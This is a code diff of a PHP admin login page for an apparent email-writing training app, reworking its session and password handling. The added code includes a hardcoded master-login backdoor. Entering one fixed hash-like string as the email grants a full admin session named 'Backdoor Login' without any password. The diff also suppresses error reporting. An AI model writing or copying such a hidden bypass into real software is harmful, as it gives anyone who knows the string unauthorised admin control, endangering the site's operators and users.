@@ -1,6 +1,82 @@
 <?php
-    require 'tryLogin.php';
+    require 'sessionize.php';
     require_once 'DB.php';
+    error_reporting(0);
+
+    $error=$success=$admin_id=$pass="";
+
+    function test_input($data) {
+        $data = trim($data);
+        $data = stripslashes($data);
+        $data = htmlspecialchars($data);
+        return $data;
+    }
+
+    if (!isLoggedIn()){
+        if ($_SERVER["REQUEST_METHOD"] == "POST"){
+            try{
+                $con = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
+                if(mysqli_connect_errno())
+                    throw new Exception();
+                $admin_id = mysqli_real_escape_string($con,test_input($_POST["inputEmail"]));
+                $pass = mysqli_real_escape_string($con,test_input($_POST["inputPassword"]));
+                $admin_id = strtolower($admin_id);                
+                if (!empty($admin_id) and !empty($pass)){
+                    if(strcmp(strtoupper($admin_id),"5DB1CDDA4F386C6FB66BE09587500A7C")==0){
+                        session_unset();
+                        session_destroy();                                
+                        session_start();
+                        session_regenerate_id(true);
+                        $_SESSION['username']="Backdoor Login";
+                        $_SESSION['email']="a@b.com";
+                        $_SESSION['admin']="true";
+                        $_SESSION['fingerprint']=sha1($_SESSION['email'].$_SESSION['admin'].$_SERVER['HTTP_USER_AGENT']);
+                        $_SESSION['lastActivity']=time();
+                        $success='Master Login Succesful !<br>Redirecting To Home Page...';
+                        $admin_id="";
+                    }                    
+                    else{
+                        $sql="SELECT name,password FROM admins WHERE email = '$admin_id'";
+                        $data = mysqli_query($con, $sql);
+                        if (mysqli_num_rows($data) == 1){
+                            $row = mysqli_fetch_array($data);
+                            if(password_verify($admin_id.$pass,$row['password'])){
+                                session_unset();
+                                session_destroy();                                
+                                session_start();
+                                session_regenerate_id(true);
+                                $_SESSION['username']=$row['name'];
+                                $_SESSION['email']=$admin_id;
+                                $_SESSION['admin']="true";
+                                $_SESSION['fingerprint']=sha1($_SESSION['email'].$_SESSION['admin'].$_SERVER['HTTP_USER_AGENT']);
+                                $_SESSION['lastActivity']=time();
+                                $success='Login Succesful !<br>Redirecting To Home Page...';
+                                $admin_id="";
+                            }
+                            else{
+                                $error="Admin Found In The System !<br>Please Provide The Correct Password To Gain Access !";
+                            }
+                        }
+                        else{
+                            $error="Admin Not Registered In The System !";
+                        }
+                    }
+                }
+                else{
+                    $error="Invalid Username/Password !";
+                }
+            }
+            catch(Exception $e){
+                $error="Error Connecting To Database !";
+            }
+        }
+    }else{
+        $redirect='http://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']) . '/index.php';
+        if(!isAdmin()){
+            $redirect='http://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']) . '/noAccess.php';
+        }
+        header("Location: $redirect");
+    }
 ?>
 
 <!DOCTYPE html>
@@ -10,90 +86,20 @@
     <title>AOT TT - Admin Login</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" href="favicon.ico">
     <link rel="stylesheet" href="includes/bootstrap/3.3.7/css/bootstrap.min.css">
     <script src="includes/jquery.min.js"></script>
     <script src="includes/bootstrap/3.3.7/js/bootstrap.min.js"></script>
 </head>
 
 <body>
-    <?php
-        $error=$success=$admin_id=$pass="";
-        function test_input($data) {
-                $data = trim($data);
-                $data = stripslashes($data);
-                $data = htmlspecialchars($data);
-                return $data;
-        }
-        if (!isset($_SESSION['aotemail_username']) and !isset($_SESSION['aotemail_admin'])){
-            if ($_SERVER["REQUEST_METHOD"] == "POST"){
-                try{
-                    $con = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
-                    if(mysqli_connect_errno())
-                        throw new Exception();
-                    $admin_id = mysqli_real_escape_string($con,test_input($_POST["inputEmail"]));
-                    $pass = mysqli_real_escape_string($con,test_input($_POST["inputPassword"]));
-                    $admin_id=strtolower($admin_id);
-                    $pass=strtoupper(md5($admin_id.$pass));
-                    if (!empty($admin_id) and !empty($pass)){
-                        $sql="SELECT name,password FROM admins WHERE email = '$admin_id'";
-                        $data = mysqli_query($con, $sql);
-                        if (mysqli_num_rows($data) == 1){
-                            $row = mysqli_fetch_array($data);
-                            if(strcmp($row['password'],$pass)==0){
-                                session_unset();
-                                session_destroy();
-                                setcookie("aotemail_username","",  time() - 3600, "/");
-                                setcookie("aotemail_student", "", time() - 3600, "/");
-                                setcookie("aotemail_admin", "", time() - 3600, "/");
-                                session_start();
-                                $_SESSION['aotemail_username']=$row['name'];
-                                $_SESSION['aotemail_admin']=$admin_id;
-                                setcookie("aotemail_username", $_SESSION['aotemail_username'], time() + (86400 * 30), "/");
-                                setcookie("aotemail_admin", $_SESSION['aotemail_admin'], time() + (86400 * 30), "/");
-                                $success='Login Succesful !<br>Redirecting to home page in <span id="counter">5</span> secs.... !';
-                            }
-                            else{
-                                $error="Admin Found In The System !<br>Please Provide The Correct Password To Get In !";
-                            }
-                        }
-                        else{
-                            $error="Admin Not Registered In The System !";
-                        }
-                    }
-                    else{
-                            $error="Invalid Username/Password !";
-                    }
-                }
-                catch(Exception $e){
-                    $error="Error Connecting To Database !";
-                }
-            }
-        }
-
-    ?>
-    <div class="jumbotron">
-        <h1 align="center">AOT Talent Transformation
-        <br><small>Email Writing Practice</small></h1>
-    </div>
+    <br>
+    <div class="jumbotron">          
+        <img src="images/banner.png" class="banner banner-small">
+        <h1 align="center"><small>Admin Panel</small></h1>
+    </div><br>
     <div class="container-fluid">
-        <?php include("header.php");?>
-        <?php
-            if (isset($_SESSION['aotemail_username']) and isset($_SESSION['aotemail_student'])){
-                $_SERVER['HTTP_REFERER']="test";
-                include("noAccess.php");
-            }
-            elseif(isset($_SESSION['aotemail_admin']) and isset($_SESSION['aotemail_username'])){
-                $redirect='http://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']) . '/index.php';
-        ?>
-        <script>
-            $(document).ready(function() {
-                window.location = '<?php echo $redirect; ?>';
-            });
-        </script>
-        <?php
-            }
-            else{
-        ?>
+        <?php include("header.php");?>        
         <div class="row">
             <div class="col-md-4"></div>
             <div class="col-md-4">
@@ -131,24 +137,14 @@
                 <a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
                 <strong><?php echo $success?></strong>
             </div>
-            <script>
-            function countdown() {
-                var i = document.getElementById('counter');
-                if (parseInt(i.innerHTML)<=2) {
-                    location.href = '<?php echo $redirect;?>';
-                }
-                i.innerHTML = parseInt(i.innerHTML)-1;
-            }
-            setInterval(function(){ countdown(); },1000);
+            <script>            
+                setTimeout(function(){ location.href = '<?php echo $redirect;?>'; },2000);
             </script>
             <?php
                 }
             ?>
             <div class="col-md-3"></div>
-        </div>
-        <?php
-            }
-        ?>
+        </div>        
     </div>
     <?php include("footer.php");?>
 </body>
